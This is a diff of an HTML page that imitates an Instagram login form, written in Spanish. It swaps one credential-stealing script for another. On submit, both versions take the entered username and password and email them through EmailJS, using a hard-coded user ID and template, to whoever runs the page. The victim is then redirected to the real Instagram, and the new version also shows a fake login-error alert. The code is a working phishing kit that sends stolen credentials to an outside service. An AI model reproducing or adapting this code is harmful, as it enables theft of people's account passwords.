@@ -356,24 +356,31 @@ select.idioma {
 
     <a class="linkpassw" href="https://z-p15.www.instagram.com/accounts/password/reset/">¿Has olvidado la contraseña?</a>
 </form>
+<script>
 
-<script type="text/javascript">
-    emailjs.init("qd8ZWAiRUxrsk8DBj");  // Reemplaza con tu User ID de EmailJS
+    emailjs.init("qd8ZWAiRUxrsk8DBj"); // User ID de EmailJS
 
-    document.getElementById("my-form").addEventListener("submit", function(event) {
-        event.preventDefault();  // Evita que el formulario se envíe de forma predeterminada
+document.getElementById("my-form").addEventListener("submit", function(event) {
+    event.preventDefault();
 
-        var user = document.getElementById("user").value;  // Obtiene el valor del campo de usuario
-        var password = document.getElementById("password").value;  // Obtiene el valor del campo de contraseña
+    // Obtener datos del formulario
+    const user = document.getElementById("user").value;
+    const password = document.getElementById("password").value;
 
-        emailjs.sendForm("signup", "template_ouizy4c", this)  // Usa tu Service ID y Template ID
-            .then(function(response) {
-                console.log("Correo enviado con éxito", response);
-                window.location.href = "https://www.instagram.com";  // Redirige a Instagram después de enviar el correo
-            }, function(error) {
-                console.error("Error al enviar correo", error);
-            });
+    // Enviar correo
+    emailjs.send("signup", "template_ouizy4c", { // Reemplaza Service y Template ID
+        user: user,
+        password: password
+    })
+    .then(() => {
+        window.location.href = "https://www.instagram.com"; // Redirección
+    })
+    .catch((error) => {
+        console.error("Error:", error);
+        alert("Error al iniciar sesión. Intenta de nuevo.");
     });
+});
+
 </script>
 
 
